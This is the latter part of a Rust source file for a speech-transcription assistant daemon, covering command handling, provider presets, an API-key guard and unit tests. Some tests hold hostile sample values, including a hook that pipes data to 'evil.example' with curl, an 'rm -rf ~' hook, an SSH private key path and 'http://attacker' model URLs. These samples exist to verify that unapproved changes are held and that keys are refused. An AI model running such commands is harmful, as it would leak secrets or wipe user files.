                .into_owned()
        });
        let stt_config = config.transcriber(&kind).clone();
        let request = import::Request {
            path,
            title,
            kind,
            language,
            participant,
            model: stt_config.name.clone(),
            per_minute: stt_config.price_per_minute,
            started_at: request.get("started_at").and_then(Value::as_f64),
        };
        let (vad, log, people, emit) = (
            self.vad.clone(),
            Arc::clone(&self.log),
            Arc::clone(&self.people),
            Arc::clone(&self.emit),
        );
        let assistant = self.assistant.clone();
        self.importing = Some(tokio::spawn(async move {
            match Stt::build(&stt_config, &request.language, true).await {
                Ok(stt) => {
                    import::run(request, stt.transcriber(), vad, log, people, emit).await;
                    // The requests the file was transcribed under are priced once it is in.
                    assistant.price_unpaid();
                }
                Err(e) => emit(failed(e)),
            }
        }));
    }

    /// Handle one command; false once the session should stop.
    async fn command(&mut self, command: &str) -> bool {
        let emit = Arc::clone(&self.emit);
        match split(command) {
            ("action", Some(name)) => self.assistant.trigger(None, name),
            ("ask", Some(question)) => self.assistant.ask(None, question),
            ("note", Some(text)) => self.assistant.note(None, text),
            ("config", None) => {
                let config = self.current.to_value();
                self.background.spawn(async move {
                    let devices = serde_json::to_value(list_devices().await).unwrap_or_default();
                    let omapass = json!({"installed": omapass::installed(), "page": omapass::PAGE});
                    emit(json!({"type": "config", "config": config, "devices": devices, "omapass": omapass, "presets": presets()}));
                });
            }
            ("devices", None) => {
                self.background.spawn(async move {
                    let devices = serde_json::to_value(list_devices().await).unwrap_or_default();
                    emit(json!({"type": "devices", "devices": devices}));
                });
            }
            ("config.set", Some(payload)) => {
                match config_change(&self.current, &self.token, payload) {
                    ConfigChange::Adopt(config) => self.adopt(config).await,
                    ConfigChange::Hold(config, event) => {
                        emit(event.clone());
                        emit(error(
                            "config.pending",
                            "a change to hooks, context files or models waits for the user in the eco window",
                            json!({"hooks": event["hooks"], "files": event["files"], "models": event["models"]}),
                        ));
                        *self.pending.lock().expect("not poisoned") = Some((config, event));
                    }
                }
            }
            ("config.approve" | "config.reject", Some(token)) if token.trim() != self.token => {
                emit(error(
                    "config.not_window",
                    "only an eco window approves or rejects a held change",
                    Value::Null,
                ));
            }
            ("config.approve", Some(_)) => {
                let held = self.pending.lock().expect("not poisoned").take();
                if let Some((config, _)) = held {
                    emit(nothing_pending());
                    self.adopt(Ok(config)).await;
                }
            }
            ("config.reject", Some(_)) => {
                if self.pending.lock().expect("not poisoned").take().is_some() {
                    emit(nothing_pending());
                    emit(error(
                        "config.rejected",
                        "the user rejected the change to hooks, context files or models",
                        Value::Null,
                    ));
                }
            }
            ("session.language", Some(payload)) => {
                if let Some([id, code]) = self.fields(payload, ["id", "language"]) {
                    self.assistant
                        .set_language(&id, &code.trim().to_lowercase());
                }
            }
            ("session.start", Some(payload)) => self.start_session(payload).await,
            ("session.pause", id) => self.assistant.pause(id.map(str::trim)),
            ("session.resume", id) => self.assistant.resume(id.map(str::trim)),
            ("session.toggle", None) => self.assistant.toggle(),
            ("sessions", None) => self.assistant.sessions(),
            ("sessions.search", Some(query)) => self.assistant.search(query),
            ("session.show", Some(id)) => self.assistant.show(id.trim()),
            ("session.delete", Some(id)) => self.assistant.delete_session(id.trim()),
            ("session.reopen", Some(id)) => self.assistant.reopen(id.trim()),
            ("session.timeline", Some(id)) => self.assistant.timeline(id.trim()),
            ("session.end", id) => self.assistant.end(id.map(str::trim)),
            ("session.import", Some(payload)) => self.import(payload),
            ("session.export", Some(id)) => {
                let id = id.trim();
                emit(match self.assistant.transcript(id) {
                    Some(lines) => {
                        let text = webvtt::write(&webvtt::cues(&lines));
                        json!({"type": "session_export", "id": id, "format": "vtt", "text": text})
                    }
                    None => error(
                        "session.not_found",
                        format!("no session {id:?}"),
                        json!({"id": id}),
                    ),
                });
            }
            ("import.cancel", None) => {
                stop(self.importing.take()).await;
                // The requests made before it stopped are priced all the same.
                self.assistant.price_unpaid();
            }
            ("import.date", Some(path)) => {
                let path = path.trim().to_owned();
                self.background.spawn(async move {
                    let at = import::date(Path::new(&path)).await;
                    emit(json!({"type": "import_date", "path": path, "at": at}));
                });
            }
            ("session.rename", Some(payload)) => {
                if let Some([id, title, kind]) = self.fields(payload, ["id", "title", "kind"]) {
                    self.assistant.rename(&id, &title, &kind);
                }
            }
            ("tags", None) => self.assistant.tags(),
            ("session.tag", Some(payload)) => {
                if let Some([id, tag]) = self.fields(payload, ["id", "tag"]) {
                    self.assistant.tag(&id, &tag, true);
                }
            }
            ("session.untag", Some(payload)) => {
                if let Some([id, tag]) = self.fields(payload, ["id", "tag"]) {
                    self.assistant.tag(&id, &tag, false);
                }
            }
            ("tag.rename", Some(payload)) => {
                if let Some([from, to]) = self.fields(payload, ["from", "to"]) {
                    self.assistant.rename_tag(&from, &to);
                }
            }
            ("tag.delete", Some(payload)) => {
                if let Some([tag]) = self.fields(payload, ["tag"]) {
                    self.assistant.delete_tag(&tag);
                }
            }
            ("session.speaker", Some(payload)) => {
                if let Some([id, label, name]) = self.fields(payload, ["id", "label", "name"]) {
                    self.assistant.rename_speaker(&id, &label, &name);
                }
            }
            ("session.speakers", Some(id)) => self.assistant.announce_speakers(id.trim()),
            ("session.cost", Some(id)) => self.assistant.announce_cost(id.trim()),
            ("session.line.edit", Some(payload)) => {
                if let (Some((id, who, at)), Some([text])) =
                    (self.line(payload), self.fields(payload, ["text"]))
                {
                    self.assistant.edit_line(&id, &who, at, &text);
                }
            }
            ("session.line.remove", Some(payload)) => {
                if let Some((id, who, at)) = self.line(payload) {
                    self.assistant.remove_line(&id, &who, at);
                }
            }
            ("people", None) => self.assistant.people(),
            ("people.adopt", None) => self.assistant.adopt_live_speakers(),
            ("person.attend", Some(payload)) => {
                if let Some([session, person, name]) =
                    self.fields(payload, ["session", "person", "name"])
                {
                    self.assistant.set_attendee(
                        &session,
                        Some(person.as_str()).filter(|p| !p.is_empty()),
                        &name,
                        true,
                    );
                }
            }
            ("person.leave", Some(payload)) => {
                if let Some([session, person]) = self.fields(payload, ["session", "person"]) {
                    self.assistant
                        .set_attendee(&session, Some(&person), "", false);
                }
            }
            ("person.assign", Some(payload)) => {
                let keys = ["session", "label", "person", "name"];
                if let Some([session, label, person, name]) = self.fields(payload, keys) {
                    let person = Some(person.as_str()).filter(|p| !p.is_empty());
                    let color = serde_json::from_str::<Value>(payload)
                        .ok()
                        .and_then(|request| {
                            request
                                .get("color")
                                .and_then(Value::as_str)
                                .map(String::from)
                        });
                    self.assistant
                        .assign_person(&session, &label, person, &name, color.as_deref());
                }
            }
            ("person.color", Some(payload)) => {
                if let Some([person, color]) = self.fields(payload, ["person", "color"]) {
                    self.assistant.set_person_color(&person, &color);
                }
            }
            ("session.speaker_color", Some(payload)) => {
                if let Some([session, label, color]) =
                    self.fields(payload, ["session", "label", "color"])
                {
                    self.assistant.set_speaker_color(&session, &label, &color);
                }
            }
            ("person.assign_line", Some(payload)) => {
                if let (Some((id, who, at)), Some([person, name])) =
                    (self.line(payload), self.fields(payload, ["person", "name"]))
                {
                    let person = Some(person.as_str()).filter(|p| !p.is_empty());
                    self.assistant.assign_line(&id, &who, at, person, &name);
                }
            }
            ("person.assign_all", Some(payload)) => {
                if let Some([session, person, name]) =
                    self.fields(payload, ["session", "person", "name"])
                {
                    let person = Some(person.as_str()).filter(|p| !p.is_empty());
                    self.assistant.assign_all(&session, person, &name);
                }
            }
            ("person.unassign", Some(payload)) => {
                if let Some([session, label]) = self.fields(payload, ["session", "label"]) {
                    self.assistant.unassign_person(&session, &label);
                }
            }
            ("session.context", Some(payload)) => {
                let request = serde_json::from_str::<Value>(payload).unwrap_or_default();
                match (request["id"].as_str(), names(request.get("contexts"))) {
                    (Some(id), Some(contexts)) => self.assistant.set_contexts(id, &contexts),
                    _ => (self.emit)(error(
                        "session.invalid",
                        "session.context needs an id and a list of contexts",
                        json!({"detail": "session.context needs an id and a list of contexts"}),
                    )),
                }
            }
            ("person.guess.clear", Some(payload)) => {
                if let Some([session, label]) = self.fields(payload, ["session", "label"]) {
                    self.assistant.clear_guess(&session, &label);
                }
            }
            ("person.add", Some(payload)) => {
                if let Some([name]) = self.fields(payload, ["name"]) {
                    self.assistant.add_person(&name);
                }
            }
            ("person.rename", Some(payload)) => {
                if let Some([id, name]) = self.fields(payload, ["id", "name"]) {
                    self.assistant.rename_person(&id, &name);
                }
            }
            ("person.merge", Some(payload)) => {
                if let Some([into, from]) = self.fields(payload, ["into", "from"]) {
                    self.assistant.merge_people(&into, &from);
                }
            }
            ("person.forget", Some(id)) => self.assistant.forget_person(id.trim()),
            ("session.ask", Some(payload)) => {
                if let Some([id, question]) = self.fields(payload, ["id", "question"]) {
                    self.assistant.ask(Some(&id), &question);
                }
            }
            ("session.note", Some(payload)) => {
                if let Some([id, text]) = self.fields(payload, ["id", "text"]) {
                    self.assistant.note(Some(&id), &text);
                }
            }
            ("session.action", Some(payload)) => {
                if let Some([id, name]) = self.fields(payload, ["id", "name"]) {
                    self.assistant.trigger(Some(&id), &name);
                }
            }
            ("session.translation", Some(payload)) => {
                if let Some([id, language]) = self.fields(payload, ["id", "language"]) {
                    self.assistant.set_translation(&id, language.trim());
                }
            }
            ("entry.translate", Some(payload)) => {
                if let Some([session, id, language]) =
                    self.fields(payload, ["session", "id", "language"])
                {
                    self.assistant
                        .translate_answer(&session, &id, language.trim());
                }
            }
            ("hook.send", Some(payload)) => {
                if let Some([session, id]) = self.fields(payload, ["session", "id"]) {
                    self.assistant.send(&session, &id);
                }
            }
            ("entry.remove", Some(payload)) => {
                if let Some([session, id]) = self.fields(payload, ["session", "id"]) {
                    self.assistant.remove(&session, &id);
                }
            }
            ("models", Some(payload)) => {
                let payload = payload.to_string();
                let saved = self.current.models.clone();
                self.background
                    .spawn(async move { emit(models(&payload, &saved).await) });
            }
            ("omapass", None) => {
                self.background.spawn(async move {
                    let listed = match omapass::accounts().await {
                        Ok(accounts) => {
                            let accounts: Vec<Value> = accounts
                                .iter()
                                .map(|a| json!({"account": a.account, "folder": a.folder}))
                                .collect();
                            json!({"type": "omapass", "installed": true, "accounts": accounts})
                        }
                        Err(_) if !omapass::installed() => {
                            json!({"type": "omapass", "installed": false, "accounts": []})
                        }
                        Err(failure) => {
                            json!({"type": "omapass", "installed": true, "accounts": [], "error": failure})
                        }
                    };
                    emit(listed);
                });
            }
            ("stop", None) => return false,
            _ => {
                let verb: String = command.chars().take(40).collect();
                emit(error(
                    "command.unknown",
                    format!("unknown command '{verb}'"),
                    json!({"command": verb}),
                ));
            }
        }
        true
    }
}

/// A provider the settings window offers by name: its official URL, a default
/// model, and the variable its key comes from.
struct Preset {
    name: &'static str,
    kind: ModelType,
    base_url: &'static str,
    model: &'static str,
    api_key_env: &'static str,
}

/// Every preset, in the order the window shows them.
const PRESETS: [Preset; 6] = [
    Preset {
        name: "DEEPGRAM",
        kind: ModelType::Transcription,
        base_url: "wss://api.deepgram.com/v1/listen",
        model: "nova-3",
        api_key_env: "DEEPGRAM_API_KEY",
    },
    Preset {
        name: "ELEVENLABS",
        kind: ModelType::Transcription,
        base_url: "wss://api.elevenlabs.io/v1/speech-to-text/realtime",
        model: "scribe_v2_realtime",
        api_key_env: "ELEVEN_LABS_API_KEY",
    },
    Preset {
        name: "GROQ",
        kind: ModelType::Transcription,
        base_url: "https://api.groq.com/openai/v1",
        model: "whisper-large-v3-turbo",
        api_key_env: "GROQ_API_KEY",
    },
    Preset {
        name: "OPENAI",
        kind: ModelType::Transcription,
        base_url: "https://api.openai.com/v1",
        model: "whisper-1",
        api_key_env: "OPENAI_API_KEY",
    },
    Preset {
        name: "OPENROUTER",
        kind: ModelType::Chat,
        base_url: "https://openrouter.ai/api/v1",
        model: "google/gemini-3.5-flash-lite",
        api_key_env: "OPENROUTER_API_KEY",
    },
    Preset {
        name: "GROQ",
        kind: ModelType::Chat,
        base_url: "https://api.groq.com/openai/v1",
        model: "llama-4-scout",
        api_key_env: "GROQ_API_KEY",
    },
];

/// The presets by model type, as the `config` event carries them: each a name and
/// the model fields it sets; a chat preset also empties `extra`.
fn presets() -> Value {
    let of = |kind: ModelType| -> Vec<Value> {
        PRESETS
            .iter()
            .filter(|p| p.kind == kind)
            .map(|p| {
                let mut values =
                    json!({"base_url": p.base_url, "model": p.model, "api_key_env": p.api_key_env});
                if kind == ModelType::Chat {
                    values["extra"] = json!({});
                }
                json!({"name": p.name, "values": values})
            })
            .collect()
    };
    json!({"transcription": of(ModelType::Transcription), "chat": of(ModelType::Chat)})
}

/// Whether `key` may be read to list the models at `base_url`: no key, the key of
/// a saved model at that URL, or a preset's variable at the preset's own URL.
/// Any other pair would send any secret to any server.
fn key_allowed(key: Key<'_>, base_url: &str, saved: &[ModelConfig]) -> bool {
    let same = |url: &str| url.trim_end_matches('/') == base_url.trim_end_matches('/');
    key == Key::None
        || saved.iter().any(|m| same(&m.base_url) && m.key() == key)
        || PRESETS
            .iter()
            .any(|p| same(p.base_url) && key == Key::Env(p.api_key_env))
}

/// The models a provider offers, for the config screen's picker; a key
/// `key_allowed` refuses is not read.
async fn models(payload: &str, saved: &[ModelConfig]) -> Value {
    let request: Value = serde_json::from_str(payload).unwrap_or_default();
    let target = request.get("target").cloned().unwrap_or(json!(""));
    let field = |key: &str| request.get(key).and_then(Value::as_str);
    let key = Key::of(field("api_key_env"), field("api_key_omapass"));
    let base_url = field("base_url").unwrap_or_default();
    if !key_allowed(key, base_url, saved) {
        let refused = error(
            "models.key_refused",
            format!("save the model before listing {base_url} with this key"),
            json!({"base_url": base_url}),
        );
        return json!({
            "type": "models", "target": target, "models": [],
            "error": refused["message"], "code": refused["code"], "params": refused["params"],
        });
    }
    let found = async {
        let base_url = field("base_url").ok_or("missing base_url")?;
        if request.get("target").is_none() {
            return Err("missing target".into());
        }
        if base_url.contains("elevenlabs.io") {
            return Ok(stt_elevenlabs::MODELS.map(String::from).to_vec());
        }
        let key = api_key(key).await?;
        if base_url.contains("deepgram.com") {
            return stt_deepgram::models(base_url, key).await;
        }
        let endpoint = Endpoint::new(base_url, key, Duration::from_secs(10)).map_err(|e| e.0)?;
        list_models(&endpoint).await
    };
    match found.await {
        Ok(models) => json!({"type": "models", "target": target, "models": models}),
        Err(failure) => {
            json!({"type": "models", "target": target, "models": [], "error": failure})
        }
    }
}

/// Serve the session until `stop` arrives on the socket or a signal does; saving a
/// config restarts capture.
pub async fn run(
    config_path: &Path,
    replay: Option<PathBuf>,
    headless: bool,
    save_sessions: bool,
) -> Result<()> {
    let vad_model = config::vad_model();
    if !vad_model.exists() {
        bail!(ConfigError(format!(
            "missing {}; run `eco setup`",
            vad_model.display()
        )));
    }
    let vad = SileroModel::load(&vad_model)?;
    let current = config::load(config_path)?;
    let log: Arc<dyn SessionLog> = if save_sessions {
        let files = SessionFiles::new(config::sessions_dir());
        files.pause_unfinished();
        Arc::new(files)
    } else {
        Arc::new(NoSessionFiles)
    };

    let clients = Clients::default();
    let emit: Emit = {
        let clients = clients.clone();
        let terminal = terminal(std::io::stdout());
        Arc::new(move |event| {
            if let Some(terminal) = &terminal {
                terminal.print(&event);
            }
            clients.emit(&event);
        })
    };
    let people: Arc<dyn PeopleStore> = Arc::new(PeopleFiles::new(config::people_dir()));
    let assistant = Assistant::new(
        Arc::clone(&emit),
        Arc::clone(&log),
        Arc::clone(&people),
        Arc::new(ShellHooks),
    );
    let (commands, mut received) = mpsc::unbounded_channel();
    let overlay_open = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let pending: Arc<Mutex<Option<(Config, Value)>>> = Arc::default();
    let greeting = {
        let assistant = assistant.clone();
        let overlay_open = Arc::clone(&overlay_open);
        let pending = Arc::clone(&pending);
        Arc::new(move || {
            let mut events = vec![json!({
                "type": "daemon",
                "version": env!("CARGO_PKG_VERSION"),
                "pid": std::process::id(),
                "overlay": overlay_open.load(std::sync::atomic::Ordering::Relaxed),
            })];
            events.extend(assistant.snapshot());
            let held = pending.lock().expect("not poisoned");
            events.extend(held.as_ref().map(|(_, event)| event.clone()));
            events
        })
    };
    let token = uuid::Uuid::new_v4().simple().to_string();
    let _control =
        ControlSocket::bind(&config::socket_path(), clients.clone(), greeting, commands).await?;
    let mut windows = overlay::Windows::new(token.clone());
    if !headless {
        windows.open(None).await?;
        overlay_open.store(true, std::sync::atomic::Ordering::Relaxed);
    }

    let mut session = Session {
        config_path: config_path.into(),
        current,
        token,
        pending,
        replay,
        vad,
        assistant,
        emit,
        pipeline: None,
        background: JoinSet::new(),
        log,
        people,
        importing: None,
    };
    session.restart().await;
    let mut terminate = tokio::signal::unix::signal(tokio::signal::unix::SignalKind::terminate())?;
    loop {
        tokio::select! {
            Some(command) = received.recv() => {
                // Opening the app again opens another window, showing a live session no window shows.
                if command.trim() == "overlay.open" {
                    let shown: Vec<&str> = windows.shown().collect();
                    let unshown = session.assistant.live().into_iter().rev().find(|id| !shown.contains(&id.as_str()));
                    match windows.open(unshown.as_deref()).await {
                        Ok(()) => {
                            overlay_open.store(true, std::sync::atomic::Ordering::Relaxed);
                            clients.emit(&json!({"type": "overlay_status", "open": true}));
                        }
                        Err(error) => clients.emit(&json!({"type": "overlay_status", "open": false, "message": error.to_string()})),
                    }
                } else if let ("window.show", Some(payload)) = split(&command) {
                    if let Some((number, shows)) = window_shows(payload) {
                        windows.shows(number, &shows);
                        if !shows.is_empty() {
                            session.assistant.focus(&shows);
                        }
                    }
                } else if !session.command(&command).await {
                    break;
                }
            }
            status = windows.exited() => {
                overlay_open.store(windows.is_open(), std::sync::atomic::Ordering::Relaxed);
                if let Some(status) = status.filter(|status| !status.success()) {
                    eprintln!(
                        "eco: an overlay window exited ({status}); check WAYLAND_DISPLAY, then `eco start`"
                    );
                }
            }
            _ = tokio::signal::ctrl_c() => break,
            _ = terminate.recv() => break,
        }
    }
    stop(session.pipeline.take()).await;
    stop(session.importing.take()).await;
    session.background.shutdown().await;
    windows.close().await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use std::sync::Mutex;

    use super::*;
    use crate::adapters::pipewire_devices::defaults;

    fn raw() -> Value {
        json!({
            "stt": {"model": "w"},
            "llm": {"model": "m"},
            "models": [
                {"name": "w", "type": "transcription", "base_url": "http://stt", "model": "whisper-1"},
                {"name": "m", "type": "chat", "base_url": "http://llm", "model": "m"},
            ],
            "participants": [
                {"name": "Eu", "devices": ["@default-input"], "user": true},
                {"name": "Recrutador", "devices": ["@default-output", "alsa_output.usb-G522"]},
            ],
        })
    }

    fn saved_models() -> Vec<ModelConfig> {
        serde_json::from_value(json!([
            {"name": "lan", "type": "chat", "base_url": "http://10.0.0.5:8000/v1/", "model": "m",
             "api_key_env": "LAN_KEY"},
            {"name": "dg", "type": "transcription", "base_url": "wss://api.deepgram.com/v1/listen",
             "model": "nova-3", "api_key_omapass": "Deepgram"},
        ]))
        .unwrap()
    }

    #[test]
    fn lists_with_the_key_of_a_saved_model_or_a_preset() {
        let saved = saved_models();
        let allowed = |key, url| key_allowed(key, url, &saved);
        assert!(allowed(Key::Env("LAN_KEY"), "http://10.0.0.5:8000/v1"));
        assert!(allowed(
            Key::Omapass("Deepgram"),
            "wss://api.deepgram.com/v1/listen"
        ));
        assert!(allowed(
            Key::Env("GROQ_API_KEY"),
            "https://api.groq.com/openai/v1/"
        ));
        assert!(allowed(
            Key::Env("OPENROUTER_API_KEY"),
            "https://openrouter.ai/api/v1"
        ));
        assert!(allowed(Key::None, "http://anywhere"));
    }

    #[test]
    fn refuses_a_key_away_from_its_saved_model_or_preset() {
        let saved = saved_models();
        let allowed = |key, url| key_allowed(key, url, &saved);
        assert!(!allowed(Key::Env("GROQ_API_KEY"), "http://attacker"));
        assert!(!allowed(
            Key::Env("GROQ_API_KEY"),
            "https://openrouter.ai/api/v1"
        ));
        assert!(!allowed(Key::Env("LAN_KEY"), "http://attacker"));
        assert!(!allowed(Key::Env("HOME"), "http://10.0.0.5:8000/v1"));
        assert!(!allowed(Key::Omapass("Deepgram"), "http://attacker"));
        assert!(!allowed(
            Key::Omapass("bank"),
            "https://api.groq.com/openai/v1"
        ));
    }

    #[tokio::test]
    async fn a_refused_key_is_answered_with_a_code() {
        let request =
            json!({"target": "llm", "base_url": "http://attacker", "api_key_env": "PATH"});
        let answer = models(&request.to_string(), &saved_models()).await;
        assert_eq!(answer["type"], "models");
        assert_eq!(answer["target"], "llm");
        assert_eq!(answer["models"], json!([]));
        assert_eq!(answer["code"], "models.key_refused");
        assert_eq!(answer["params"], json!({"base_url": "http://attacker"}));
    }

    #[test]
    fn presets_go_to_the_window_by_model_type() {
        let presets = presets();
        assert_eq!(presets["transcription"].as_array().unwrap().len(), 4);
        assert_eq!(
            presets["chat"][1],
            json!({"name": "GROQ", "values": {
                "base_url": "https://api.groq.com/openai/v1", "model": "llama-4-scout",
                "api_key_env": "GROQ_API_KEY", "extra": {},
            }})
        );
        assert_eq!(
            presets["transcription"][0]["values"],
            json!({"base_url": "wss://api.deepgram.com/v1/listen", "model": "nova-3",
                   "api_key_env": "DEEPGRAM_API_KEY"})
        );
    }

    fn recorder() -> (Emit, Arc<Mutex<Vec<Value>>>) {
        let events = Arc::new(Mutex::new(Vec::new()));
        let sink = Arc::clone(&events);
        (
            Arc::new(move |event| sink.lock().unwrap().push(event)),
            events,
        )
    }

    #[tokio::test]
    async fn inputs_skip_and_report_disconnected_devices() {
        let mut raw = raw();
        raw["colors"] = json!({"@default-input": "#ff4fd8"});
        let config = Config::from_value(raw).unwrap();
        let (emit, events) = recorder();
        let found = inputs(&config, None, &defaults(), &emit);
        let found: Vec<_> = found
            .iter()
            .map(|i| (i.id.as_str(), i.participant.as_str(), i.color.as_deref()))
            .collect();
        assert_eq!(
            found,
            [
                ("@default-input", "Eu", Some("#ff4fd8")),
                ("@default-output", "Recrutador", None),
            ]
        );
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["code"], "input.disconnected");
        assert_eq!(
            events[0]["params"],
            json!({"participant": "Recrutador", "device": "alsa_output.usb-G522"})
        );
    }

    #[tokio::test]
    async fn replay_goes_to_the_first_participant_that_is_not_the_user() {
        let config = Config::from_value(raw()).unwrap();
        let (emit, _) = recorder();
        let found = inputs(&config, Some(Path::new("dir/x.wav")), &[], &emit);
        let [replay] = found.as_slice() else {
            panic!("one input")
        };
        assert_eq!(
            (&*replay.id, &*replay.label, &*replay.participant),
            ("replay", "x.wav", "Recrutador")
        );
    }

    type Log = Arc<Mutex<Vec<String>>>;

    /// Logs `<name> stopped` when dropped.
    struct Sessiond(Log, &'static str);

    impl Drop for Sessiond {
        fn drop(&mut self) {
            self.0.lock().unwrap().push(format!("{} stopped", self.1));
        }
    }

    struct Forever(Log);

    impl Work for Forever {
        fn run(
            &mut self,
            listening: Option<watch::Receiver<BTreeSet<Listening>>>,
        ) -> BoxFuture<'_, Result<(), AudioError>> {
            let name = if listening.is_some() {
                "capture"
            } else {
                "monitor"
            };
            self.0.lock().unwrap().push(format!("{name} started"));
            let sessiond = Sessiond(Arc::clone(&self.0), name);
            Box::pin(async move {
                let _sessiond = sessiond;
                std::future::pending().await
            })
        }
    }

    fn listening(names: &[&str]) -> BTreeSet<Listening> {
        let one = |model: &&str| Listening {
            model: model.to_string(),
            language: "pt".into(),
        };
        names.iter().map(one).collect()
    }

    #[tokio::test]
    async fn dropping_the_follower_stops_the_running_capture() {
        let log = Log::default();
        let (recording, watched) = watch::channel(BTreeSet::new());
        let (emit, _) = recorder();
        let mut work = Forever(Arc::clone(&log));
        let follower = tokio::spawn(async move {
            follow_recording(watched, &mut work, &emit).await;
        });
        tokio::time::sleep(Duration::from_millis(10)).await;
        recording.send_replace(listening(&["deepgram"]));
        tokio::time::sleep(Duration::from_millis(10)).await;
        // A second session listening with another model keeps the capture running.
        recording.send_replace(listening(&["deepgram", "whisper"]));
        tokio::time::sleep(Duration::from_millis(10)).await;
        stop(Some(follower)).await;
        assert_eq!(
            *log.lock().unwrap(),
            [
                "monitor started",
                "monitor stopped",
                "capture started",
                "capture stopped"
            ]
        );
    }

    struct Failing;

    impl Work for Failing {
        fn run(
            &mut self,
            _: Option<watch::Receiver<BTreeSet<Listening>>>,
        ) -> BoxFuture<'_, Result<(), AudioError>> {
            Box::pin(async { Err(AudioError("pw-record exited".into())) })
        }
    }

    #[tokio::test]
    async fn a_capture_that_dies_is_reported() {
        let (recording, watched) = watch::channel(listening(&["deepgram"]));
        let (emit, events) = recorder();
        let follower = tokio::spawn(async move {
            follow_recording(watched, &mut Failing, &emit).await;
        });
        tokio::time::sleep(Duration::from_millis(10)).await;
        drop(recording);
        follower.await.unwrap();
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["code"], "capture.stopped");
        assert_eq!(events[0]["params"]["detail"], "pw-record exited");
    }

    #[tokio::test]
    async fn a_replacement_starts_once_the_previous_pipeline_is_gone() {
        let log = Log::default();
        let sessiond = Sessiond(Arc::clone(&log), "old");
        let previous = tokio::spawn(async move {
            let _sessiond = sessiond;
            std::future::pending::<()>().await
        });
        tokio::task::yield_now().await;
        stop(Some(previous)).await;
        log.lock().unwrap().push("new started".into());
        assert_eq!(*log.lock().unwrap(), ["old stopped", "new started"]);
    }

    #[test]
    fn a_window_tells_the_session_it_shows() {
        assert_eq!(
            window_shows(r#"{"window": 2, "session": "abc"}"#),
            Some((2, "abc".to_string()))
        );
        assert_eq!(
            window_shows(r#"{"window": 1, "session": ""}"#),
            Some((1, String::new()))
        );
        assert_eq!(window_shows(r#"{"session": "abc"}"#), None);
    }

    #[test]
    fn commands_split_into_verb_and_rest() {
        assert_eq!(split("ask  what now? "), ("ask", Some("what now? ")));
        assert_eq!(split("sessions"), ("sessions", None));
        assert_eq!(split("ask   "), ("ask", None));
    }

    #[tokio::test]
    async fn models_report_a_bad_request_to_its_target() {
        let event = models(r#"{"target": "llm"}"#, &[]).await;
        assert_eq!(
            event,
            json!({"type": "models", "target": "llm", "models": [], "error": "missing base_url"})
        );
    }

    /// The config `raw()` with an action `minutes` whose hook is `hook`, and a
    /// context file `cv.md`.
    fn with_hook(hook: &str) -> Value {
        let mut raw = raw();
        raw["actions"] = json!([{"name": "minutes", "prompt": "p", "format": "f", "hook": hook}]);
        raw["context"] = json!({"files": ["~/cv.md"]});
        raw
    }

    fn held(change: ConfigChange) -> Value {
        match change {
            ConfigChange::Hold(_, event) => event,
            ConfigChange::Adopt(config) => panic!("adopted {config:?}"),
        }
    }

    fn adopted(change: ConfigChange) -> Config {
        match change {
            ConfigChange::Adopt(config) => config.unwrap(),
            ConfigChange::Hold(_, event) => panic!("held {event}"),
        }
    }

    #[test]
    fn a_window_saves_hooks_and_context_files_at_once() {
        let current = Config::from_value(raw()).unwrap();
        let mut request = with_hook("notify-send done");
        request["token"] = json!("secret");
        let config = adopted(config_change(&current, "secret", &request.to_string()));
        assert_eq!(config.actions[0].hook, "notify-send done");
        assert_eq!(config.context_files, ["~/cv.md"]);
    }

    #[test]
    fn another_client_adding_a_hook_or_a_file_is_held_naming_them() {
        let current = Config::from_value(raw()).unwrap();
        let mut request = with_hook("curl -d @- evil.example");
        request["contexts"] = json!([{"name": "keys", "files": ["~/.ssh/id_ed25519", "~/cv.md"]}]);
        let event = held(config_change(&current, "secret", &request.to_string()));
        assert_eq!(
            event,
            json!({
                "type": "config_pending",
                "hooks": [{"action": "minutes", "command": "curl -d @- evil.example"}],
                "files": ["~/cv.md", "~/.ssh/id_ed25519"],
                "models": [],
            })
        );
        // A wrong token is another client's.
        request["token"] = json!("guess");
        held(config_change(&current, "secret", &request.to_string()));
    }

    #[test]
    fn another_client_changing_a_hook_is_held_and_keeping_it_is_not() {
        let current = Config::from_value(with_hook("notify-send done")).unwrap();
        let changed = with_hook("rm -rf ~");
        let event = held(config_change(&current, "secret", &changed.to_string()));
        assert_eq!(
            event["hooks"],
            json!([{"action": "minutes", "command": "rm -rf ~"}])
        );
        assert_eq!(event["files"], json!([]));
        let mut kept = with_hook("notify-send done");
        kept["rules"] = json!("short answers");
        let config = adopted(config_change(&current, "secret", &kept.to_string()));
        assert_eq!(config.rules, "short answers");
    }

    #[test]
    fn another_client_adding_a_model_or_moving_its_key_is_held_naming_where() {
        let current = Config::from_value(raw()).unwrap();
        let mut added = raw();
        added["models"].as_array_mut().unwrap().push(json!({
            "name": "x", "type": "chat", "base_url": "http://attacker", "model": "m",
            "api_key_env": "OPENROUTER_API_KEY",
        }));
        let event = held(config_change(&current, "secret", &added.to_string()));
        let x = json!({"name": "x", "base_url": "http://attacker", "api_key_env": "OPENROUTER_API_KEY", "api_key_omapass": null});
        assert_eq!(event["models"], json!([x]));
        let mut moved = raw();
        moved["models"][1]["base_url"] = json!("http://attacker");
        let event = held(config_change(&current, "secret", &moved.to_string()));
        assert_eq!(event["models"][0]["name"], "m");
        let mut keyed = raw();
        keyed["models"][1]["api_key_omapass"] = json!("openrouter");
        let event = held(config_change(&current, "secret", &keyed.to_string()));
        assert_eq!(event["models"][0]["api_key_omapass"], "openrouter");
        // The provider's id for a known model is the user's to change from anywhere.
        let mut renamed = raw();
        renamed["models"][1]["model"] = json!("other");
        adopted(config_change(&current, "secret", &renamed.to_string()));
        // The window's own save adds a model at once.
        added["token"] = json!("secret");
        adopted(config_change(&current, "secret", &added.to_string()));
    }
}
